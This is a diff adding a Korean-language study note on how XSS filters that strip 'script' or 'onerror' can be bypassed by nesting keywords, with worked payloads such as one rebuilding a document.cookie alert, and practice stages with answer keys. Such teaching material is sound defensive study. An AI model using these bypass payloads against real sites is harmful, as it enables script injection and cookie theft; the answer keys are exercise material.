@@ -1,0 +1,73 @@
+String Substitution (문자열 치환) :
+    의심되는 XSS 구문을 거부하는 대신 단순히 치환 또는 제거하는 관습 또한 존재합니다.
+
+    이는 필터되는 문자열 사이에 또 다른 필터되는 문자열을 넣으면
+    최종적으로 바깥에 필터링되는 문자열이 다시 나타나게 되어 필터가 무력화될 뿐더러
+    웹 응용 방화벽(Web Application Firewall) 등에서 탐지하지 못하게되는 부작용이 발생하게 됩니다.
+
+    ex)
+        (x => x.replace(/script/g, ''))('<scrscriptipt>alscriptert(documescriptnt.cooscriptkie)</scrscriptipt>')
+        --> <script>alert(document.cookie)</script>
+        
+        (x => x.replace(/onerror/g, ''))('<img oneonerrorrror=promonerrorpt(1)>')
+        --> <img onerror=prompt(1) />
+
+    대안 접근 방식으로 흔히 다음과 같이 문자열에 변화가 없을 때까지 지속적으로 치환하는 방식이 사용되곤 합니다.
+    
+    특정 키워드가 최종 마크업에 등장하지 않도록 하는 데에는 효과적일 수 있지만 미처 고려하지 못한 구문의 존재,
+    WAF(Web Application Firewall) 방어 무력화 등은 동일하다는 점을 기억해야 합니다.
+
+    ex)
+        function replaceIterate(text) {
+            while (true) {
+                var newText = text
+                    .replace(/script|onerror/gi, '');
+                if (newText === text) break;
+                text = newText;
+            }
+            return text;
+        }
+        replaceIterate('<imgonerror src="data:image/svg+scronerroriptxml,&lt;svg&gt;" onloadonerror="alert(1)" />')
+        --> <img src="data:image/svg+xml,&lt;svg&gt;" onload="alert(1)" />
+        replaceIterate('<ifronerrorame srcdoc="&lt;sonerrorcript&gt;parent.alescronerroriptrt(1)&lt;/scrionerrorpt&gt;" />')
+        --> <iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;" />
+
+실습 : 주어진 필터링을 우회해서 alert를 실행시키면 됩니다.
+    
+    Stage 1 : 
+        function XSSFilter(data){
+            return data.replace(/script/gi, '');
+        }
+
+        답 : <img src="about:" onerror="alert(1)" />
+            or
+            <scrscriptipt>alert(1)</scrscriptipt>
+
+    Stage 2 :
+        function XSSFilter(data){
+            return data.replace(/onerror/gi, '');
+        }
+        
+        답 : <img src=about: onerronerroror=alert(1)>
+            or
+            <script>alert(1)</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
